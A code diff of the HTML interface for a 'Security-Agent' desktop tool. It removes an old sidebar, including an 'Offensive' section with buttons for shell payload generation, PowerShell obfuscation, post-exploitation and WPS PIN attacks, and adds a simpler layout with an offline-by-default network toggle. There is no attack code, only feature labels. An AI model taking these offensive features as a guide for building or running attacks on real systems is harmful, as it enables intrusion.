@@ -3,1138 +3,551 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self';">
-    <title>Security-Agent</title>
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none';">     <title>Security-Agent</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div id="app">
-        <!-- Sidebar -->
+        <!-- ═══ Sidebar ═══ -->
         <nav id="sidebar">
             <div class="sidebar-header">
                 <div class="logo">
-                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
                     </svg>
                 </div>
                 <div class="logo-text">
                     <span class="app-name">Security-Agent</span>
-                    <span class="app-version">v0.1.0</span>
+                    <span class="app-version" id="app-version">v2.0</span>
                 </div>
             </div>
 
-            <div class="sidebar-section">
-                <div class="section-label">Overview</div>
-                <button class="nav-item active" data-panel="dashboard">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
-                    <span>Dashboard</span>
+            <div class="sidebar-nav">
+                <button class="nav-item active" data-view="home">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
+                    <span>Home</span>
                 </button>
-                <button class="nav-item" data-panel="status">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
-                    <span>System Status</span>
+                <button class="nav-item" data-view="objectives">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg>
+                    <span>Objectives</span>
+                    <span class="nav-new">multi-tool</span>
                 </button>
-            </div>
-
-            <div class="sidebar-section">
-                <div class="section-label">Tools</div>
-                <button class="nav-item" data-panel="tools">
+                <button class="nav-item" data-view="analyze">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
-                    <span>Run Tool</span>
+                    <span>Analyze</span>
                 </button>
-                <button class="nav-item" data-panel="skills">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>
-                    <span>Skills</span>
-                </button>
-                <button class="nav-item" data-panel="external">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
-                    <span>External Tool</span>
-                </button>
-                <button class="nav-item" data-panel="list-tools">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"/><line x1="3" y1="9" x2="21" y2="9"/><line x1="9" y1="21" x2="9" y2="9"/></svg>
-                    <span>List Tools</span>
-                </button>
-            </div>
-
-            <div class="sidebar-section">
-                <div class="section-label">Engagement</div>
-                <button class="nav-item" data-panel="plan-scan">
+                <button class="nav-item" data-view="engage">
                     <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-                    <span>Plan Scan</span>
+                    <span>Engage</span>
                 </button>
-                <button class="nav-item" data-panel="findings">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
-                    <span>Findings</span>
+                <button class="nav-item" data-view="server">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+                    <span>Server</span>
+                    <span class="nav-new">listen</span>
                 </button>
-                <button class="nav-item" data-panel="retest">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
-                    <span>Schedule Retest</span>
-                </button>
-            </div>
-
-            <div class="sidebar-section">
-                <div class="section-label">Data</div>
-                <button class="nav-item" data-panel="audit">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
-                    <span>Audit Log</span>
-                </button>
-                <button class="nav-item" data-panel="audit-db">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
-                    <span>Audit Database</span>
-                </button>
-                <button class="nav-item" data-panel="findings-db">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
-                    <span>Findings Database</span>
-                </button>
-                <button class="nav-item" data-panel="calibration-db">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
-                    <span>Calibration DB</span>
-                </button>
-                <button class="nav-item" data-panel="reasoning-db">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
-                    <span>Reasoning Log</span>
-                </button>
-            </div>
-
-            <div class="sidebar-section">
-                <div class="section-label">Intelligence</div>
-                <button class="nav-item" data-panel="llm-generate">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
-                    <span>Generate Text</span>
-                </button>
-                <button class="nav-item" data-panel="llm-anomaly">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
-                    <span>Anomaly Score</span>
-                </button>
-                <button class="nav-item" data-panel="ask">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
-                    <span>Ask (NLU)</span>
-                </button>
-            </div>
-
-            <div class="sidebar-section">
-                <div class="section-label">Offensive</div>
-                <button class="nav-item" data-panel="offensive-hash">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>
-                    <span>Hash ID</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-password">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-                    <span>Password Strength</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-wordlist">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
-                    <span>Gen Wordlist</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-shell">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
-                    <span>Gen Shell Payload</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-payload">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                    <span>Analyze Payload</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-evasion">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                    <span>PS Obfuscation</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-wireless">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
-                    <span>Wireless Audit</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-postexploit">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
-                    <span>Post-Exploit</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-decoys">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
-                    <span>Gen Decoys</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-handshake">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
-                    <span>Analyze Handshake</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-wps">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><circle cx="12" cy="16" r="1"/></svg>
-                    <span>WPS PIN</span>
-                </button>
-                <button class="nav-item" data-panel="offensive-keys">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
-                    <span>Analyze Keys</span>
+                <button class="nav-item" data-view="library">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>
+                    <span>Library</span>
                 </button>
             </div>
 
             <div class="sidebar-footer">
-                <button class="nav-item" data-panel="help-guide">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
-                    <span>Help & Guide</span>
-                </button>
-                <button class="nav-item" data-panel="about">
-                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
-                    <span>About</span>
-                </button>
+                <div class="mode-toggle" id="mode-toggle" title="Network mode — offline is the default; online requires per-invocation opt-in">
+                    <button class="mode-btn active" id="mode-offline" data-mode="offline">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 1l22 22"/><path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"/><path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"/><path d="M10.71 5.05A16 16 0 0 1 22.56 9"/><path d="M1.42 9a15.91 15.91 0 0 1 4.7-2.88"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
+                        Offline
+                    </button>
+                    <button class="mode-btn" id="mode-online" data-mode="online">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
+                        Online
+                    </button>
+                </div>
+                <div class="sidebar-status" id="sidebar-status">
+                    <span class="status-dot" id="status-dot"></span>
+                    <span id="status-text">Checking binary…</span>
+                </div>
             </div>
         </nav>
 
-        <!-- Main Content -->
+        <!-- ═══ Main ═══ -->
         <main id="main-content">
-            <!-- Binary Warning Banner -->
             <div id="binary-warning" class="binary-warning" style="display:none;">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
-                <span>security-agent binary not found. Run <code>make build</code> first, or place the binary in <code>target/release/</code>.</span>
+                <span>security-agent binary not found. Build it with <code>make build</code> or place it in <code>target/release/</code>.</span>
             </div>
-            <!-- Dashboard Panel -->
-            <section class="panel active" id="panel-dashboard">
-                <div class="panel-header">
-                    <div class="panel-header-row">
+
+            <!-- ═══ VIEW: HOME ═══ -->
+            <section class="view active" id="view-home">
+                <div class="view-inner">
+                    <div class="hero">
+                        <h1>Security operations, minus the setup.</h1>
+                        <p class="subtitle">Run real tools, chain them into objectives, and audit everything — from one box.</p>
+                        <div class="cmd-bar">
+                            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                            <input type="text" id="cmd-bar" placeholder="Describe a security task in plain language — then run, plan, or open a tool" autocomplete="off" spellcheck="false">
+                            <button class="btn primary" id="btn-cmd-go">Go</button>
+                        </div>
+                        <div class="cmd-suggestions" id="cmd-suggestions"></div>
+                    </div>
+
+                    <div class="stat-grid" id="stat-grid">
+                        <div class="stat-card">
+                            <div class="stat-icon green">&#10003;</div>
+                            <div class="stat-body">
+                                <div class="stat-value" id="stat-binary">…</div>
+                                <div class="stat-label">Binary</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon blue">&#9874;</div>
+                            <div class="stat-body">
+                                <div class="stat-value" id="stat-tools">…</div>
+                                <div class="stat-label">Cataloged tools</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon purple">&#9670;</div>
+                            <div class="stat-body">
+                                <div class="stat-value" id="stat-builtin">…</div>
+                                <div class="stat-label">Offline substitutes</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon orange">&#9635;</div>
+                            <div class="stat-body">
+                                <div class="stat-value" id="stat-skills">…</div>
+                                <div class="stat-label">Embedded skills</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon teal">&#9733;</div>
+                            <div class="stat-body">
+                                <div class="stat-value" id="stat-coverage">…</div>
+                                <div class="stat-label">Capability coverage</div>
+                            </div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-icon gray">&#128225;</div>
+                            <div class="stat-body">
+                                <div class="stat-value" id="stat-mode">…</div>
+                                <div class="stat-label">Network mode</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="home-split">
                         <div>
-                            <h1>Dashboard</h1>
-                            <p class="subtitle">Security-Agent orchestration overview</p>
+                            <h3>Quick actions</h3>
+                            <div class="action-grid" id="quick-actions"></div>
                         </div>
-                        <div class="mode-toggle" id="mode-toggle">
-                            <button class="mode-btn active" id="mode-offline" data-mode="offline">
-                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 1l22 22"/><path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"/><path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"/><path d="M10.71 5.05A16 16 0 0 1 22.56 9"/><path d="M1.42 9a15.91 15.91 0 0 1 4.7-2.88"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
-                                <span>Offline</span>
-                            </button>
-                            <button class="mode-btn" id="mode-online" data-mode="online">
-                                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
-                                <span>Online</span>
-                            </button>
+                        <div>
+                            <h3>Recent activity</h3>
+                            <div class="recent-list" id="recent-list">
+                                <div class="empty-state">Nothing run yet. Your last tasks will appear here for one-click re-runs.</div>
+                            </div>
                         </div>
                     </div>
-                </div>
-                <div class="dashboard-grid">
-                    <div class="stat-card" id="stat-binary">
-                        <div class="stat-icon green"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div>
-                        <div class="stat-body">
-                            <div class="stat-value" id="binary-status">Checking...</div>
-                            <div class="stat-label">Binary Status</div>
+
+                    <div class="console-wrap">
+                        <h3>Console</h3>
+                        <div class="output-block" id="home-output">
+                            <div class="empty-state">Run something from the bar above, or pick a quick action.</div>
                         </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon blue"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg></div>
-                        <div class="stat-body">
-                            <div class="stat-value" id="tools-count">--</div>
-                            <div class="stat-label">Cataloged Tools</div>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon purple"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg></div>
-                        <div class="stat-body">
-                            <div class="stat-value" id="skills-count">--</div>
-                            <div class="stat-label">Embedded Skills</div>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon orange"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
-                        <div class="stat-body">
-                            <div class="stat-value" id="coverage-status">--</div>
-                            <div class="stat-label">Capability Coverage</div>
-                        </div>
-                    </div>
-                </div>
-                <div class="dashboard-quick-actions">
-                    <h3>Quick Actions</h3>
-                    <div class="action-grid">
-                        <button class="action-btn" data-panel="tools"><span class="action-icon">&#9889;</span>Run a Tool</button>
-                        <button class="action-btn" data-panel="plan-scan"><span class="action-icon">&#128269;</span>Plan a Scan</button>
-                        <button class="action-btn" data-panel="ask"><span class="action-icon">&#128172;</span>Ask in Plain English</button>
-                        <button class="action-btn" data-panel="skills"><span class="action-icon">&#128218;</span>Browse Skills</button>
                     </div>
                 </div>
             </section>
 
-            <!-- System Status Panel -->
-            <section class="panel" id="panel-status">
-                <div class="panel-header">
-                    <h1>System Status</h1>
-                    <p class="subtitle">Offline status and capability health</p>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-refresh-status">Refresh Status</button>
-                </div>
-                <div class="output-block" id="output-status">
-                    <div class="empty-state">Click "Refresh Status" to load system status.</div>
-                </div>
-            </section>
-
-            <!-- Run Tool Panel -->
-            <section class="panel" id="panel-tools">
-                <div class="panel-header">
-                    <h1>Run Built-in Tool</h1>
-                    <p class="subtitle">Execute an offline local analyzer</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="tool-name">Tool</label>
-                        <select id="tool-name">
-                            <option value="autopsy">autopsy</option>
-                            <option value="volatility">volatility</option>
-                            <option value="wireshark">wireshark</option>
-                            <option value="binwalk">binwalk</option>
-                            <option value="foremost">foremost</option>
-                            <option value="bulk_extractor">bulk_extractor</option>
-                            <option value="hashdeep">hashdeep</option>
-                        </select>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="tool-input-path">Input Path</label>
-                        <div class="input-with-button">
-                            <input type="text" id="tool-input-path" placeholder="/path/to/input/file">
-                            <button class="btn secondary" id="btn-browse-tool-input">Browse</button>
-                        </div>
-                    </div>
-                    <div class="form-group full-width">
-                        <label for="tool-output-path">Output .txt Path <span class="optional">(optional)</span></label>
-                        <div class="input-with-button">
-                            <input type="text" id="tool-output-path" placeholder="/path/to/output.txt">
-                            <button class="btn secondary" id="btn-browse-tool-output">Browse</button>
-                        </div>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-run-tool">Run Tool</button>
-                </div>
-                <div class="output-block" id="output-tools">
-                    <div class="empty-state">Select a tool and input path, then click Run.</div>
-                </div>
-            </section>
-
-            <!-- Skills Panel -->
-            <section class="panel" id="panel-skills">
-                <div class="panel-header">
-                    <h1>Skills</h1>
-                    <p class="subtitle">Browse and inspect embedded skill definitions</p>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-list-skills">Load Skills</button>
-                    <div class="search-input" style="flex:1;margin-left:8px;">
-                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-                        <input type="text" id="skill-search" placeholder="Filter skills...">
-                    </div>
-                </div>
-                <div class="skill-layout">
-                    <div class="skill-list" id="skill-list">
-                        <div class="empty-state">Click "Load Skills" to see available skills.</div>
-                    </div>
-                    <div class="skill-detail" id="skill-detail">
-                        <div class="empty-state">Select a skill to view its definition.</div>
-                    </div>
-                </div>
-            </section>
-
-            <!-- External Tool Panel -->
-            <section class="panel" id="panel-external">
-                <div class="panel-header">
-                    <h1>Run External Tool</h1>
-                    <p class="subtitle">Execute a locally installed cataloged tool</p>
-                </div>
-                <div class="form-grid">
-                    <div class="form-group">
-                        <label for="ext-tool-name">Tool Name</label>
-                        <input type="text" id="ext-tool-name" placeholder="e.g. nmap, semgrep, sqlmap">
-                    </div>
-                    <div class="form-group">
-                        <label for="ext-tool-args">Arguments</label>
-                        <input type="text" id="ext-tool-args" placeholder="space-separated arguments">
-                    </div>
-                    <div class="form-group full-width">
-                        <label class="checkbox-label">
-                            <input type="checkbox" id="ext-allow-network">
-                            <span>Allow live network / active testing (--allow-network)</span>
-                        </label>
-                    </div>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-run-external">Run External Tool</button>
-                </div>
-                <div class="output-block" id="output-external">
-                    <div class="empty-state">Configure the tool and click Run.</div>
-                </div>
-            </section>
-
-            <!-- List Tools Panel -->
-            <section class="panel" id="panel-list-tools">
-                <div class="panel-header">
-                    <h1>Cataloged Tools</h1>
-                    <p class="subtitle">List all registered tools with status and integrity</p>
-                </div>
-                <div class="action-bar">
-                    <button class="btn primary" id="btn-list-tools">Load Tools</button>
-                </div>
-                <div class="output-block" id="output-list-tools">
-                    <div class="empty-state">Click "Load Tools" to see the full tool catalog.</div>
-                </div>
-            </section>
-
-            <!-- Plan Scan Panel -->
-            <section class="panel" id="panel-plan-scan">
